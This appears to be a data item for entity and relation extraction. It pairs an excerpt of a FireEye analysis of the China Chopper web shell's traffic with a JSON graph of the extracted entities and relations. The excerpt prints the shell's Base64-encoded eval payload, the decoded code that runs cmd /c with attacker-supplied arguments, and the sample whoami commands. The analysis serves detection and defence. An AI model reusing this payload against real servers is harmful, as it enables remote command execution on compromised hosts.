@@ -1,0 +1,114 @@
+
+
+
+Sentence : Traffic Analysis
+After examining the server-side payload and the client used to control the Web shell, the next step
+to understanding China Chopper is observing its traffic. Having both the server and client components
+enables researchers to start a packet capture to view the contents of typical traffic. As shown in
+Figure 23, the client initiates the connection over TCP port 80 using the HTTP POST method.
+Figure 23: A packet capture shows that
+the Web shell traffic is HTTP POST traffic
+over TCP port 80
+6 Tony Lee. “Manually Exploiting Tomcat Manager.” September 2012.
+FireEye, Inc. The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell 16
+Because this is TCP traffic, researchers can “follow the TCP” stream in Wireshark, a popular open-source
+network-protocol analyzer that works in Unix and Windows. [7] In Figure 24, the traffic in red at the top is
+from the attacker (Web client). The traffic shown in blue at the bottom is the response from the target
+(Web shell).
+Figure 24: After following the TCP
+stream, researchers can see that
+the majority of the attacker traffic
+is Base64 encoded
+7 Wireshark is available at http://www.wireshark.org/.
+FireEye, Inc. The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell 17
+As highlighted above, the majority of the attacker traffic appears to be Base64 encoded. This is not a
+problem though, because it can be easily decoded. Using the “TextWizard” feature of the free Fiddler
+Web debugger reveals what the attacker is sending. [8]
+(Note: %3D is a URL-encoded representation of the equal sign (“=”). Fiddler needs this to be converted
+to an equal sign for proper decoding.)
+Raw attacker traffic:
+Password=Response.Write(“->|”);
+var err:Exception;try{eval(System.Text.Encoding.GetEncoding(65001).
+GetString(System. Convert.FromBase64String
+(“dmFyIGM9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvKFN5c3R
+lbS5UZXh0LkVuY29kaW5n
+LkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc
+2U2NFN0cmluZyhSZXF1ZX
+N0Lkl0ZW1bInoxIl0pKSk7dmFyIGU9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXN
+zKCk7dmFyIG91dDpTeXN0
+ZW0uSU8uU3RyZWFtUmVhZGVyLEVJOlN5c3RlbS5JTy5TdHJlYW1SZWFkZXI7Yy5Vc2VTa
+GVsbEV4ZWN1dGU9ZmFsc2
+U7Yy5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0PXRydWU7Yy5SZWRpcmVjdFN0YW5kYXJkRXJ
+yb3I9dHJ1ZTtlLlN0YXJ0
+SW5mbz1jO2MuQXJndW1lbnRzPSIvYyAiK1N5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY
+29kaW5nKDY1MDAxKS5HZX
+RTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1
+bInoyIl0pKTtlLlN0YXJ0
+KCk7b3V0PWUuU3RhbmRhcmRPdXRwdXQ7RUk9ZS5TdGFuZGFyZEVycm9yO2UuQ2xvc2Uo
+KTtSZXNwb25zZS5Xcml0ZS
+hvdXQuUmVhZFRvRW5kKCkrRUkuUmVhZFRvRW5kKCkpOw%3D%3D”)),”unsafe”);}
+catch(err){Response.Write
+(“ERROR:// “%2Berr.message);}Response.Write(“|<-”);Response.
+End();&z1=Y21k&z2=Y2QgL2QgImM6
+XGluZXRwdWJcd3d3cm9vdFwiJndob2FtaSZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%3D%3D
+As shown In Figure 25, the Fiddler Web debugger text wizard easily converts the raw traffic from
+Base64 to plain text.
+Figure 25: Fiddler Web debugger
+decodes the Base64 traffic
+8 Fiddler is available at http://fiddler2.com/.
+FireEye, Inc. The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell 18
+Decoded traffic:
+varc=newSystem.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEn­
+coding(65001).
+GetString(System.Convert.FromBase64String(Request.Item[“z1”])));
+vare=newSystem.Diagnostics.Process();
+varout:System.IO.StreamReader,EI:System.IO.StreamReader;
+c.UseShellExecute=false;
+c.RedirectStandardOutput=true;c.RedirectStandardError=true;
+e.StartInfo=c;c.Arguments=”/c”+System.Text.Encoding.GetEncoding(65001).
+GetString(System.Convert.FromBase64String(Request.Item[“z2”]));
+e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();
+Response.Write(out.ReadToEnd()+EI.ReadToEnd());
+The decoded traffic presents something more readable. But the Base64-decoded traffic shows an
+attempt to decode more Base64 traffic stored as “z1” and “z2.” The attacker traffic shows z1 and z2
+parameters immediately after the end of the “Password” parameter.
+The Base64-encoded parameters z1 and z2 are highlighted in the following output:
+&z1=Y21k&z2=Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJndob2FtaSZlY2hvIFtTXSZ
+jZCZlY2hvIFtFXQ%3D%3D
+Base64-decoded parameters z1 and z2:
+z1=cmdz2=cd /d “c:\inetpub\wwwroot\”&whoami&echo [S]&cd&echo [E]
+This code explains how the client communicates with the shell. The “Password” parameter passes the
+code to the payload to be executed. The z1 is cmd, and z2 contains the arguments to the command
+prompt sent via cmd /c. All output is sent to standard output (stdout) back to the attacker, which
+creates the following response to the whoami command and the present working directory:
+->|nt authority\network service[S]C:\Inetpub\wwwroot[E]|<
+FireEye, Inc. The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell 19
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "China Chopper", "type" : "TTPS"},
+        {"id": 2, "description": "Web shell", "type" : "APPS"},
+        {"id": 3, "description": "HTTP POST method", "type" : "NETP"},
+        {"id": 4, "description": "TCP port 80", "type" : "NETP"},
+        {"id": 5, "description": "Wireshark", "type" : "APPS"},
+        {"id": 6, "description": "Base64 encoded traffic", "type" : "TAMP"},
+        {"id": 7, "description": "Fiddler Web debugger", "type" : "APPS"},
+        {"id": 8, "description": "cmd", "type" : "EXEF"},
+        {"id": 9, "description": "c:\\inetpub\\wwwroot\\", "type" : "SYSP"},
+        {"id": 10, "description": "nt authority\\network service", "type" : "ACTO"},
+        {"id": 11, "description": "whoami command", "type" : "EXEF"},
+        {"id": 12, "description": "Password parameter", "type" : "TAMP"}
+    ],
+    "edges": [
+        {"source": 1, "target": 2, "rel_name" : "uses"},
+        {"source": 2, "target": 3, "rel_name" : "communicates through"},
+        {"source": 3, "target": 4, "rel_name" : "runs on"},
+        {"source": 2, "target": 6, "rel_name" : "sends"},
+        {"source": 5, "target": 6, "rel_name" : "analyzes"},
+        {"source": 7, "target": 6, "rel_name" : "decodes"},
+        {"source": 8, "target": 9, "rel_name" : "executes in"},
+        {"source": 10, "target": 2, "rel_name" : "runs on"},
+        {"source": 11, "target": 10, "rel_name" : "returns identity of"},
+        {"source": 12, "target": 2, "rel_name" : "authenticates with"}
+    ]
+}
